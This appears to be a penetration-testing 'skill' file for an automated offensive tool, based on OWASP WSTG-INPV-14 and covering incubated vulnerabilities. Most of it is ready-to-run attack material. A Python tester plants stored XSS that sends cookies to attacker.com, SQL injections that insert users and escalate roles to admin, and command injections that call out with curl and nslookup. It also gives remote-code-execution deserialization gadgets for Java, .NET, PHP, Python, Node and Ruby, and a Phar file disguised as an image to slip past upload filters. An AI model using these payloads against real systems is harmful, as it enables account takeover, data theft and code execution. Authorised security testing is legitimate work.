---
name: wstg-inpv-14
description: "Testing for Incubated Vulnerabilities"
category: input-validation
owasp_id: WSTG-INPV-14
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, xss, sqli, wstg, inpv]
tech_stack: []
cwe_ids: []
chains_with: [wstg-inpv-01, wstg-inpv-02]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-inpv-02: "An incubated Stored XSS payload that triggers specifically when viewed in an authenticated admin/back-office context = Critical (Full Admin Account Takeover), rather than a lower-severity self-XSS"
---

# wstg-inpv-14

## Test ID

WSTG-INPV-14

## Test Name

Testing for Incubated Vulnerabilities

## High-Level Description

Incubated vulnerabilities are attacks where the malicious payload is stored initially and executed later in a different context or time. These include stored XSS that triggers on admin pages, time-delayed SQL injection, or payloads that activate when processed by scheduled jobs or different users.

---

## What to Check

- [ ] Stored payloads executed in different contexts
- [ ] Admin panel stored XSS
- [ ] Scheduled job exploitation
- [ ] Second-order SQL injection
- [ ] Email/notification triggers
- [ ] Report/export functionality exploitation

---

## How to Test

### Step 1: Identify Incubation Points

```bash
#!/bin/bash
TARGET="https://target.com"

echo "[*] Testing for Incubated Vulnerabilities..."

# Store payloads in various input fields
# Check if they trigger in admin panels, reports, or emails

# Register with malicious username
curl -s -X POST "$TARGET/register" \
    -d "username=<script>alert('XSS')</script>" \
    -d "email=test@test.com" \
    -d "password=test123"

# Submit feedback with payload
curl -s -X POST "$TARGET/feedback" \
    -d "name=Test" \
    -d "message=<script>fetch('http://attacker.com/'+document.cookie)</script>"

# Create order with malicious product name
curl -s -X POST "$TARGET/api/order" \
    -H "Content-Type: application/json" \
    -d '{"product":"<img src=x onerror=alert(1)>","qty":1}'
```

### Step 2: Incubated Vulnerability Tester

```python
#!/usr/bin/env python3
"""
Incubated Vulnerability Tester
Tests for second-order/delayed execution vulnerabilities
"""

import requests
import time
import uuid

class IncubatedVulnTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.findings = []
        self.session = requests.Session()
        self.unique_id = str(uuid.uuid4())[:8]

    # Incubated payloads with unique identifiers
    def get_payloads(self):
        return {
            'xss': [
                f'<script>fetch("http://attacker.com/xss?id={self.unique_id}")</script>',
                f'<img src=x onerror="fetch(\'http://attacker.com/xss?id={self.unique_id}\')">',
                f'"><script>document.location="http://attacker.com/steal?c="+document.cookie</script>',
            ],
            'sqli': [
                f"'; INSERT INTO users VALUES('{self.unique_id}', 'hacked'); --",
                f"'; UPDATE users SET role='admin' WHERE username='{self.unique_id}'; --",
                f"1'; WAITFOR DELAY '0:0:5'; --",  # Time-based for later
            ],
            'command': [
                f"; curl http://attacker.com/cmd?id={self.unique_id}",
                f"; nslookup {self.unique_id}.attacker.com",
            ],
            'ssti': [
                f"{{{{config}}}}",
                f"${{7*7}}",
                f"#{{7*7}}",
            ],
        }

    def test_user_registration(self):
        """Test user registration for incubated XSS in admin panel"""
        print("\n[*] Testing user registration incubation...")

        payloads = self.get_payloads()

        for payload in payloads['xss']:
            try:
                # Register with malicious username
                response = self.session.post(
                    f"{self.base_url}/register",
                    data={
                        'username': payload,
                        'email': f"test_{self.unique_id}@test.com",
                        'password': 'TestPass123!'
                    }
                )

                if response.status_code in [200, 201, 302]:
                    print(f"  [INFO] User registered with payload: {payload[:40]}...")
                    self.findings.append({
                        'type': 'Incubated XSS (Registration)',
                        'payload': payload,
                        'trigger': 'Admin user list/management',
                        'severity': 'High',
                        'note': 'Check admin panel for execution'
                    })

            except Exception as e:
                pass

    def test_feedback_system(self):
        """Test feedback/support system for incubated XSS"""
        print("\n[*] Testing feedback system incubation...")

        payloads = self.get_payloads()

        for payload in payloads['xss']:
            try:
                response = self.session.post(
                    f"{self.base_url}/feedback",
                    data={
                        'name': f"Test User {self.unique_id}",
                        'email': f"test_{self.unique_id}@test.com",
                        'subject': f"Test Subject {self.unique_id}",
                        'message': payload
                    }
                )

                if response.status_code in [200, 201, 302]:
                    print(f"  [INFO] Feedback submitted with payload")
                    self.findings.append({
                        'type': 'Incubated XSS (Feedback)',
                        'payload': payload,
                        'trigger': 'Admin reads feedback/support ticket',
                        'severity': 'High'
                    })

            except Exception as e:
                pass

    def test_order_processing(self):
        """Test order/transaction system"""
        print("\n[*] Testing order processing incubation...")

        payloads = self.get_payloads()

        malicious_order = {
            'product_name': payloads['xss'][0],
            'quantity': 1,
            'notes': payloads['sqli'][0],
            'shipping_address': payloads['xss'][1]
        }

        try:
            response = self.session.post(
                f"{self.base_url}/api/orders",
                json=malicious_order
            )

            if response.status_code in [200, 201]:
                print(f"  [INFO] Order created with malicious data")
                self.findings.append({
                    'type': 'Incubated Payload (Order)',
                    'trigger': 'Order processing, reports, invoices',
                    'severity': 'High',
                    'note': 'Check order reports, PDF generation, emails'
                })

        except Exception as e:
            pass

    def test_second_order_sqli(self):
        """Test second-order SQL injection"""
        print("\n[*] Testing second-order SQL injection...")

        # Store payload in profile
        sqli_payload = "admin'--"

        try:
            # Create user with SQLi payload as username
            self.session.post(
                f"{self.base_url}/register",
                data={
                    'username': sqli_payload,
                    'password': 'TestPass123!',
                    'email': f'test_{self.unique_id}@test.com'
                }
            )

            # Login
            self.session.post(
                f"{self.base_url}/login",
                data={
                    'username': sqli_payload,
                    'password': 'TestPass123!'
                }
            )

            # Trigger action that uses stored username
            response = self.session.get(f"{self.base_url}/profile")

            print(f"  [INFO] Second-order SQLi test completed")
            print(f"  [NOTE] Manually verify if injection triggered")
            self.findings.append({
                'type': 'Second-Order SQLi Test',
                'payload': sqli_payload,
                'trigger': 'Profile viewing, password reset, etc.',
                'severity': 'High',
                'note': 'Manual verification required'
            })

        except Exception as e:
            pass

    def test_scheduled_jobs(self):
        """Test payloads that might trigger in scheduled jobs"""
        print("\n[*] Testing scheduled job incubation...")

        # Create data that might be processed by batch jobs
        payloads = self.get_payloads()

        # Example: Submit data for report generation
        try:
            response = self.session.post(
                f"{self.base_url}/api/report/schedule",
                json={
                    'title': payloads['xss'][0],
                    'data_query': payloads['sqli'][0],
                    'format': 'pdf'
                }
            )

            if response.status_code in [200, 201]:
                self.findings.append({
                    'type': 'Scheduled Job Incubation',
                    'payload': 'XSS + SQLi in report',
                    'trigger': 'Scheduled report generation',
                    'severity': 'High',
                    'note': 'Check generated reports'
                })

        except Exception as e:
            pass

    def test_email_templates(self):
        """Test email/notification templates"""
        print("\n[*] Testing email template incubation...")

        payloads = self.get_payloads()

        # Trigger password reset or notification
        try:
            response = self.session.post(
                f"{self.base_url}/forgot-password",
                data={
                    'email': f"{payloads['xss'][0]}@test.com"
                }
            )

            # Or update profile with payload
            response = self.session.post(
                f"{self.base_url}/profile/update",
                data={
                    'display_name': payloads['xss'][0],
                    'bio': payloads['ssti'][0]
                }
            )

            self.findings.append({
                'type': 'Email Template Incubation',
                'trigger': 'Email notifications, password resets',
                'severity': 'Medium',
                'note': 'Check outgoing emails'
            })

        except Exception as e:
            pass

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("INCUBATED VULNERABILITY REPORT")
        print("="*60)
        print(f"\nUnique Test ID: {self.unique_id}")
        print("Use this ID to identify your payloads in callbacks/logs")

        if not self.findings:
            print("\nNo incubation points identified.")
        else:
            print(f"\n{len(self.findings)} potential incubation points found:\n")
            for f in self.findings:
                print(f"[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {str(f['payload'])[:50]}...")
                if 'trigger' in f:
                    print(f"  Trigger: {f['trigger']}")
                if 'note' in f:
                    print(f"  Note: {f['note']}")
                print()

    def run_tests(self):
        """Run all incubation tests"""
        self.test_user_registration()
        self.test_feedback_system()
        self.test_order_processing()
        self.test_second_order_sqli()
        self.test_scheduled_jobs()
        self.test_email_templates()
        self.generate_report()

# Usage
tester = IncubatedVulnTester("https://target.com")
tester.run_tests()
```

---

## Tools

| Tool              | Purpose                |
| ----------------- | ---------------------- |
| Burp Collaborator | OOB callback detection |
| XSS Hunter        | Blind XSS detection    |
| Custom scripts    | Payload tracking       |

---

## Example Commands/Payloads

```bash
# Plant a uniquely-tagged stored XSS payload, then check where it fires later
TAG=$(openssl rand -hex 4)
curl -s -X POST "https://{target}/register" \
  -d "username=<script>fetch('https://{collaborator}/xss?id=$TAG')</script>" \
  -d "email=test_$TAG@test.com" -d "password=TestPass123!"

# Plant a stored SQLi payload as a username, trigger it later via login
curl -s -X POST "https://{target}/register" -d "username=admin'--" -d "password=TestPass123!"
curl -s -X POST "https://{target}/login" -d "username=admin'--" -d "password=TestPass123!"
```

| Payload | Trigger Context | Detection Pattern |
| --- | --- | --- |
| `<script>fetch('https://{collaborator}/xss?id={tag}')</script>` as username/bio | Admin user list, support ticket view | Callback received on collaborator listener |
| `admin'--` as username | Login, profile query re-using stored value | SQL error or auth bypass on the later request |
| `{{config}}` / `${7*7}` in profile fields | Email templates, PDF/report generation | Template evaluated inside the exported report/email |

### Insecure Deserialization as an Incubation Vector

A serialized object stored now (cookie, hidden form field, cache entry, message queue) and deserialized later by a different component (worker, admin tool, another microservice) is a classic incubated vulnerability. First fingerprint the format from raw bytes/base64, then use the matching gadget-chain generator:

| Object Type | Header (Hex) | Header (Base64) | Indicator |
| --- | --- | --- | --- |
| .NET ViewState | `FF 01` | `/w` | Hidden `__VIEWSTATE` form field |
| Java Serialized | `AC ED` | `rO` | Base64-decoded first bytes |
| PHP Serialized | `4F 3A` | `Tz` | `O:`, `a:`, `s:`, `i:`, `b:` prefixes |
| Python Pickle | `80 04 95` | `gASV` | Opcodes like `(lp0, S'Test'` when decoded |
| Ruby Marshal | `04 08` | `BAgK` | `\x04\x08` at start after base64 decode |

```bash
# Java - generate a gadget chain payload and plant it where it will be deserialized later
java -jar ysoserial.jar CommonsCollections1 'curl http://{collaborator}' > payload.bin
curl -s -X POST "https://{target}/api/import" --data-binary @payload.bin -H "Content-Type: application/x-java-serialized-object"

# PHP - object injection gadget chain via phpggc, planted in a cookie/session value read back later
phpggc monolog/rce1 system 'id' -s
curl -s "https://{target}/" -b "session_data=O:8:\"Monolog...\""  # paste phpggc output

# Python - pickle payload that executes on next deserialization (e.g. cache/session restore)
python3 -c "import pickle,os,base64
class E:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(E())).decode())"
```

Detection: the payload doesn't need to execute immediately — flag the finding once you confirm (a) the app accepts/stores raw serialized data from an untrusted source, and (b) a downstream component (report generator, admin import tool, message consumer) later deserializes it without validation.

### .NET — Formatters and ysoserial.net

Detection: `AAEAAD`/`AAEAAAD` (hex/leading base64) = `BinaryFormatter`; `FF 01` (hex) / `/w` (base64) = ViewState.

```powershell
# BinaryFormatter (look for System.Runtime.Serialization.Binary.BinaryFormatter, requires [Serializable])
ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "whoami" -t

# Json.Net (look for JsonConvert.DeserializeObject with TypeNameHandling != None)
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe" -t

# LosFormatter (internally uses BinaryFormatter) / classic ASP.NET ViewState
ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64 -t

# XmlSerializer — attacker must control the Type passed to XmlSerializer(typeof(<TYPE>))
ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "calc.exe"

# NetDataContractSerializer (look for NetDataContractSerializer().ReadObject())
ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```

Plant the generated payload wherever the app deserializes untrusted data later: hidden `__VIEWSTATE` form field, a JSON API body typed with `TypeNameHandling.All`/`Auto`, a cached/session blob read back by another endpoint. `irsdl/ysonet` is an actively-maintained alternative to `ysoserial.net` with the same CLI shape.

### Java — Gadget Chains and Format-Specific Tools

Detection: `AC ED 00 05` (hex) / `rO0` (base64) for native Java serialization; `Content-Type: application/x-java-serialized-object`; `H4sIAAAAAAAAAJ` (gzip+base64).

```bash
# ysoserial — pick the gadget chain matching libraries on the target's classpath
java -jar ysoserial.jar CommonsCollections1 'curl http://{collaborator}' > payload.bin
java -jar ysoserial.jar CommonsCollections6 'id' | base64
java -jar ysoserial.jar Spring1 'id' > spring.bin
java -jar ysoserial.jar Groovy1 'id' > groovy.bin
java -jar ysoserial.jar URLDNS 'http://{collaborator}' > blind.bin   # no gadget deps — confirms deserialization occurs via DNS callback

curl -s -X POST "https://{target}/api/import" --data-binary @payload.bin -H "Content-Type: application/x-java-serialized-object"

# marshalsec — for non-native formats (Jackson, XStream, Kryo, Hessian/Burlap, Castor, JYAML, SnakeYAML, JsonIO, Red5AMF, BlazeDS)
java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://{collaborator}/#Exploit" 1389
```

Common gadget chains: `CommonsCollections1-7`, `CommonsBeanutils1`, `Spring1/2`, `Groovy1`, `Hibernate1/2`, `Jdk7u21`, `JRMPClient`/`JRMPListener`, `ROME`, `Clojure`, `BeanShell1`, `MozillaRhino1/2`, `AspectJWeaver`, `Vaadin1`, `Wicket1`.

YAML (SnakeYAML) gadget:

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://{collaborator}/"]
  ]]
]
```

JSON polymorphic deserialization (Jackson `TypeNameHandling`-style, CVE-2017-7525 / CVE-2019-12384 / CVE-2020-9548):

```json
["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://{collaborator}/inject.sql'"}]
```

JSF ViewState (Mojarra/MyFaces incubation point): base64 `rO0` = server-object graph, base64+gzip `H4sIAAA` = client-side state; check default MAC/encryption secrets in `org.apache.myfaces.SECRET`/`MAC_SECRET` before assuming the state is protected.

### Node.js — node-serialize / funcster

Detection: search source/`package.json` for `node-serialize`, `serialize-to-js`, or `funcster`.

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://{collaborator}', function(error,stdout,stderr){console.log(stdout)});}()"}
```

funcster:

```json
{"rce":{"__js_function":"function(){const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)});}()"}}
```

### PHP — phpggc Gadgets and Phar Deserialization

```bash
# phpggc — targets specific frameworks/libraries present in the app
phpggc monolog/rce1 system 'id' -s
phpggc laravel/rce9 system 'id' -s
phpggc symfony/rce4 system 'id' -s
phpggc guzzlehttp/fw1 /var/www/html/shell.php /tmp/data -s
```

Phar deserialization triggers `unserialize()` on the Phar's metadata via ANY file-operation function (`file_exists`, `file_get_contents`, `getimagesize`, `md5_file`, `file_get_contents("phar://...")`) — no direct `unserialize()` call is required:

```bash
curl -s "https://{target}/upload/avatar.php?file=phar://./uploads/evil.jpg"
```

Craft the file with a phpggc-generated Phar (`-p phar` output flag) or manually via `Phar::setMetadata()`, and disguise it with a valid image magic-byte prefix (e.g. `\xff\xd8\xff`) to bypass upload filters — PHP only requires `__HALT_COMPILER();` at the end of the stub, content before it is unrestricted.

### Python — Pickle and PyYAML

```python
# pickle __reduce__ gadget (also see the wstg-inpv-18 SSTI skill for related os.system/eval primitives)
python3 -c "import pickle,os,base64
class E:
    def __reduce__(self):
        return (os.system, ('curl http://{collaborator}',))
print(base64.b64encode(pickle.dumps(E())).decode())"
```

```yaml
# PyYAML unsafe_load / Loader=yaml.UnsafeLoader — the default SafeLoader (PyYAML >= 6.0) is NOT vulnerable
!!python/object/apply:os.system ["curl http://{collaborator}"]
!!python/object/apply:subprocess.Popen [["id"]]
```

Tool: `j0lt-github/python-deserialization-attack-payload-generator` auto-generates payloads for pickle, PyYAML, ruamel.yaml and jsonpickle.

### Ruby — Marshal and YAML.load

```ruby
# Marshal.load — no cross-version generic gadget; use a chain matching the target's Ruby version (2.0-2.5 script from PATT)
Marshal.load(["<hex-encoded gadget>"].pack("H*"))
```

Universal `YAML.load` gadget for Ruby <= 2.7.2 (uses only RubyGems internals, no third-party gems required):

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source::SpecificFile
    spec: &1 !ruby/object:Gem::StubSpecification
      loaded_from: "|id 1>&2"
  - !ruby/object:Gem::Source::SpecificFile
      spec:
```

Universal gadget for Ruby 2.x - 3.x:

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

---

## Remediation

```python
# Sanitize output everywhere, not just on input
# Input might be safe in one context but dangerous in another

from markupsafe import escape

def render_user_data(data):
    # Always escape when rendering
    return escape(data)

# Use Content Security Policy
# Prevents stored XSS from executing
response.headers['Content-Security-Policy'] = "default-src 'self'"

# Use parameterized queries for all database operations
# Prevents second-order SQL injection
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

---

## Risk Assessment

| Finding                     | CVSS | Severity |
| --------------------------- | ---- | -------- |
| Stored XSS in admin panel   | 8.4  | High     |
| Second-order SQL injection  | 8.6  | High     |
| Incubated command injection | 9.8  | Critical |

---

## CWE Categories

| CWE ID     | Title                |
| ---------- | -------------------- |
| **CWE-79** | Cross-Site Scripting |
| **CWE-89** | SQL Injection        |


---

## References

- [OWASP WSTG - WSTG-INPV-14: Testing for Incubated Vulnerability](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerability)
- [PayloadsAllTheThings - Insecure Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)

---

## Checklist

```
[ ] User registration incubation tested
[ ] Feedback/support system tested
[ ] Order/transaction system tested
[ ] Second-order SQLi tested
[ ] Email templates tested
[ ] Scheduled jobs considered
[ ] Callback server monitored
[ ] Findings documented
```
